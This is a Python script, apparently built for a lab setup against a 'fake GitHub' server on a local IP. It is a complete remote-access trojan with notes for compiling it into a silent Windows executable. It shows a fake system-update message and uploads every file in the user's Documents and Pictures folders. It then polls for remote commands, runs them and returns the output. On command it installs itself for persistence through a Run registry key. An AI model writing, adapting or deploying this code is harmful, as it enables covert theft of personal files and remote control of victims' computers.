
#pip install pyinstaller
#pyinstaller --onefile --noconsole VMVictimScript_V2.py
#!/usr/bin/env python3
import os
import sys
import time
import requests
import subprocess
import ctypes

# Configuration URLs for your fake GitHub
FAKE_GITHUB_BASE = "http://192.168.1.4/fake-github"
COMMANDS_URL = FAKE_GITHUB_BASE + "/Commands.txt"
OUTPUT_URL   = FAKE_GITHUB_BASE + "/Output.txt"
EXFIL_BASE_URL = FAKE_GITHUB_BASE + "/Exfiltration"

# Directories to exfiltrate (adjust if needed)
USERPROFILE = os.environ.get("USERPROFILE", "C:\\Users\\Victim")
DOCUMENTS_DIR = os.path.join(USERPROFILE, "Documents")
PICTURES_DIR = os.path.join(USERPROFILE, "Pictures")

def show_fake_update():
    """Display a fake system update message to the user."""
    message = "Completed Loading new firewall policies"
    title = "System Update"
    ctypes.windll.user32.MessageBoxW(0, message, title, 0)

def upload_file(filepath, url):
    """Upload a single file to the specified URL using an HTTP PUT request."""
    try:
        with open(filepath, 'rb') as f:
            data = f.read()
        response = requests.put(url, data=data)
        if response.status_code in (200, 201):
            print(f"Uploaded {filepath} successfully.")
        else:
            print(f"Failed to upload {filepath}: {response.status_code}")
    except Exception as e:
        print(f"Error uploading {filepath}: {e}")

def upload_files():
    """Iterate over Documents and Pictures folders and upload each file."""
    for directory in [DOCUMENTS_DIR, PICTURES_DIR]:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                for file in files:
                    filepath = os.path.join(root, file)
                    # For simplicity, use the file name as the target file name.
                    target_url = f"{EXFIL_BASE_URL}/{file}"
                    upload_file(filepath, target_url)
        else:
            print(f"Directory {directory} does not exist.")

def get_command():
    """Fetch the command from the fake GitHub Commands.txt file."""
    try:
        response = requests.get(COMMANDS_URL)
        if response.status_code == 200:
            return response.text.strip()
    except Exception as e:
        print("Error fetching command:", e)
    return ""

def send_output(output):
    """Send the command output to the fake GitHub Output.txt file."""
    try:
        response = requests.put(OUTPUT_URL, data=output)
        if response.status_code in (200, 201):
            print("Output uploaded successfully.")
        else:
            print("Failed to upload output:", response.status_code)
    except Exception as e:
        print("Error sending output:", e)

def persist_exe_user():
    """
    Copies the current executable to a user-writable location (%APPDATA%\RightPoint)
    and creates a registry key in HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    to ensure it runs on user logon. The copied executable is renamed to RightPointV2.exe.
    """
    import shutil
    import winreg  # For registry operations

    current_exe = os.path.abspath(sys.argv[0])
    appdata = os.environ.get("APPDATA", "C:\\Users\\Public\\AppData")
    target_dir = os.path.join(appdata, "RightPoint")
    target_exe = os.path.join(target_dir, "RightPointV2.exe")
    
    try:
        if not os.path.exists(target_dir):
            os.makedirs(target_dir, exist_ok=True)
            print(f"Created target directory: {target_dir}")
        shutil.copy(current_exe, target_exe)
        print(f"Copied executable from {current_exe} to {target_exe}")
    except Exception as e:
        print(f"Error copying executable: {e}")
        return
    
    # Add a registry key in HKCU for persistence
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "RightPointV2", 0, winreg.REG_SZ, target_exe)
        winreg.CloseKey(key)
        print("Registry key for persistence added successfully.")
    except Exception as e:
        print(f"Error writing registry key: {e}")

def main():
    # Show a fake update popup and wait a moment to simulate an update.
    show_fake_update()
    time.sleep(2)

    # 1. Immediately upload all files from Documents and Pictures.
    print("Starting file exfiltration...")
    upload_files()

    # 2. Poll for command changes.
    last_command = ""
    print("Monitoring for new commands...")
    while True:
        command = get_command()
        if command and command != last_command:
            print("New command received:", command)
            last_command = command
            # Check if the command is "persist"
            if command.strip().lower() == "persist":
                print("Triggering persistence mechanism...")
                persist_exe_user()
            else:
                # Otherwise, execute the command on the victim system.
                output = subprocess.getoutput(command)
                print("Command output:\n", output)
                send_output(output)
        time.sleep(5)  # Poll every 5 seconds

if __name__ == "__main__":
    main()
